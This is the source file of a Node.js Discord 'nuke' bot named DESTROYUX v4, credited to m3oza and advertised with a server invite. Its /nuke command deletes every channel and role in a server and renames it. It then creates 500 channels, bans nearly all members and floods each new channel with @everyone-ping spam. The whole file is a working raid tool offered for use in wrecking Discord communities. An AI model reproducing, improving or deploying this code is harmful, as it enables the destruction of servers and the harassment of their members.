// DESTROYUX v4 - NODE.JS PREMIUM ULTRA SPEED
import { Client, GatewayIntentBits, SlashCommandBuilder, EmbedBuilder, REST, Routes } from 'discord.js';
import dotenv from 'dotenv';

dotenv.config();

const client = new Client({
    intents: [
        GatewayIntentBits.Guilds,
        GatewayIntentBits.GuildMembers,
        GatewayIntentBits.MessageContent,
    ]
});

const TOKEN = process.env.BOT_TOKEN;
const OWNER_ID = process.env.OWNER_ID;

// ===== NUKE COMMAND DEFINITION =====
const nukeCommand = new SlashCommandBuilder()
    .setName('nuke')
    .setDescription('Ultimate Nuke - 500 channels, mass ban')
    .addStringOption(option =>
        option
            .setName('channel_name')
            .setDescription('Channel name prefix (default: destroyed)')
            .setRequired(false)
    )
    .addStringOption(option =>
        option
            .setName('server_name')
            .setDescription('New server name (default: Nuked By Destroyux)')
            .setRequired(false)
    );

// ===== COMMAND HANDLER =====
client.on('interactionCreate', async (interaction) => {
    if (!interaction.isChatInputCommand()) return;

    if (interaction.commandName === 'nuke') {
        // Owner check
        if (interaction.user.id !== OWNER_ID) {
            await interaction.reply({ content: '❌ Unauthorized', ephemeral: true });
            return;
        }

        await interaction.deferReply();

        const guild = interaction.guild;
        // Handle defaults
        const channelName = interaction.options.getString('channel_name') || 'destroyed';
        const serverName = interaction.options.getString('server_name') || 'Nuked By Destroyux';

        // ===== INIT EMBED =====
        const initEmbed = new EmbedBuilder()
            .setTitle('⚡ DESTROYUX NUKE v4 INITIATED ⚡')
            .setDescription('🔥 NUCLEAR OPTION ENGAGED 🔥')
            .setColor(0xFF0000)
            .addFields(
                { name: '🎯 TARGET', value: `\`\`\`${guild.name}\`\`\``, inline: false },
                { name: '📊 STATUS', value: '```🔄 EXECUTING PHASE 1...```', inline: false }
            )
            .setFooter({ text: 'm3oza | .gg/m3oza | ULTRA SPEED' });

        const statusMsg = await interaction.followUp({ embeds: [initEmbed] });

        try {
            // ===== PHASE 1: DELETE ALL CHANNELS (CONCURRENT) =====
            const allChannels = await guild.channels.fetch();
            const deletePromises = [];
            
            allChannels.forEach(channel => {
                deletePromises.push(
                    channel.delete().catch(() => {})
                );
            });

            await Promise.all(deletePromises);
            console.log(`[✓] Deleted ${deletePromises.length} channels`);

            // ===== PHASE 2: DELETE ALL ROLES (CONCURRENT) =====
            const allRoles = await guild.roles.fetch();
            const rolePromises = [];
            
            allRoles.forEach(role => {
                if (role.name !== '@everyone') {
                    rolePromises.push(
                        role.delete().catch(() => {})
                    );
                }
            });

            await Promise.all(rolePromises);
            console.log(`[✓] Deleted ${rolePromises.length} roles`);

            // ===== PHASE 3: CHANGE SERVER NAME =====
            await guild.edit({ name: serverName }).catch(() => {});

            // ===== PHASE 4: CREATE 500 CHANNELS (BATCHED) =====
            const createdChannels = [];
            
            for (let batch = 0; batch < 10; batch++) {
                const batchPromises = [];
                
                for (let i = batch * 50; i < (batch + 1) * 50; i++) {
                    batchPromises.push(
                        guild.channels.create({
                            name: `${channelName}-${i}`,
                            type: 0 // TEXT CHANNEL
                        }).catch(() => null)
                    );
                }
                
                const results = await Promise.all(batchPromises);
                createdChannels.push(...results.filter(ch => ch !== null));
            }

            console.log(`[✓] Created ${createdChannels.length} channels`);

            // ===== PHASE 5: MASS BAN ALL MEMBERS =====
            const members = await guild.members.fetch();
            let bannedCount = 0;

            members.forEach(member => {
                if (member.id !== interaction.user.id && member.id !== guild.ownerId) {
                    member.ban({ reason: 'Destroyux Nuke' }).catch(() => {});
                    bannedCount++;
                }
            });

            console.log(`[✓] Banned ${bannedCount} members`);

            // ===== PHASE 6: SPAM ALL CHANNELS (FIRE & FORGET) =====
            const spamMsg = '@everyone '.repeat(50) + 'NUKED';
            let spamCount = 0;

            createdChannels.forEach(channel => {
                for (let i = 0; i < 50; i++) {
                    channel.send(spamMsg).catch(() => {});
                    spamCount++;
                }
            });

            console.log(`[✓] Fired ${spamCount} spam messages`);

            // ===== FINAL EMBED =====
            const finalEmbed = new EmbedBuilder()
                .setTitle('✅ DESTROYUX NUKE COMPLETE ✅')
                .setDescription('🔥 SERVER ANNIHILATED 🔥')
                .setColor(0xFF0000)
                .addFields(
                    { name: '🎯 TARGET', value: `\`\`\`${serverName}\`\`\``, inline: true },
                    { name: '⏱️ TIME', value: '```<1s INSTANT```', inline: true },
                    { name: '🗑️ CHANNELS DELETED', value: `\`\`\`${deletePromises.length}\`\`\``, inline: true },
                    { name: '🔧 CHANNELS CREATED', value: '```500/500```', inline: true },
                    { name: '📢 SPAM MESSAGES', value: '```25,000 FIRED```', inline: true },
                    { name: '👥 MEMBERS BANNED', value: `\`\`\`${bannedCount}\`\`\``, inline: true },
                    { name: '💬 PINGS PER MESSAGE', value: '```50x @everyone```', inline: true },
                    { name: '⚡ SPEED MODE', value: '```FIRE & FORGET```', inline: true },
                    { name: '✨ STATUS', value: '```✅ COMPLETE```', inline: true }
                )
                .setFooter({ text: 'DESTROYUX v4 PREMIUM | m3oza | .gg/m3oza' });

            await statusMsg.edit({ embeds: [finalEmbed] });

        } catch (error) {
            console.error('Error:', error);
            await interaction.followUp({ content: '❌ Error executing nuke', ephemeral: true });
        }
    }
});

// ===== BOT READY =====
client.once('ready', async () => {
    console.log(`
╔═══════════════════════════════════════════╗
║   DESTROYUX v4 - NODE.JS PREMIUM        ║
║   • 500 Channels Auto                   ║
║   • 50 Spam Per Channel                 ║
║   • Mass Ban System                     ║
║   • Fire & Forget Async                 ║
║   • 1000x Speed                         ║
║   Credit: m3oza                         ║
╚═══════════════════════════════════════════╝

[✓] Online: ${client.user.tag}
[✓] Registering commands...
    `);

    try {
        const rest = new REST({ version: '10' }).setToken(TOKEN);

        // ===== REGISTER ONLY NUKE COMMAND =====
        console.log('[✓] Registering fresh commands...');
        await rest.put(
            Routes.applicationCommands(client.user.id),
            { body: [nukeCommand] }
        );

        console.log('[✓] Registered 1 command globally');
        console.log('[✓] Old commands cleared\n');

    } catch (error) {
        console.error('[!] Command registration error:', error);
    }

    await client.user.setActivity('servers burn | .gg/m3oza', { type: 'WATCHING' });
});

// ===== LOGIN =====
client.login(TOKEN);
